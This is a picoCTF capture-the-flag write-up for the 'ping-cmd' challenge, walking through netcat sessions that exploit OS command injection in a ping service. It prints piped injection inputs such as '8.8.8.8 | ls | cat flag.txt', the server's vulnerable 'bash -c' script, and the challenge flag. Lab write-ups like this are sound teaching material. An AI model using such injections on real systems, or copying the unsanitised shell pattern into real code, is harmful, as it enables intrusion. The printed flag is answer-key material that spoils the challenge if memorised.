# 📡 ping-cmd (picoCTF)
- **Category:** General Skills
- **Points:** 100
- **Difficulty:** Easy
- **Format:** Interactive CLI / OS Command Injection

---

## 📖 Challenge Overview
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

![Challenge Details](./assets/challenge_details.png)

---

## 💻 Command Flow

```bash
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): goofle.com
PING goofle.com (212.92.104.122) 56(84) bytes of data.

--- goofle.com ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1009ms

                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ls -a
                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 ls
                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8ls
                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls 
flag.txt
script.sh
                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 61805
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls | cat flag.txt
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_773788ba}                                                                             

                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/pico-ctf-notes]
└─$ nc mysterious-sea.picoctf.net 55390
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ls | cat script.sh
#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"
```

---

## 🚩 Flag

```text
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_773788ba}
```
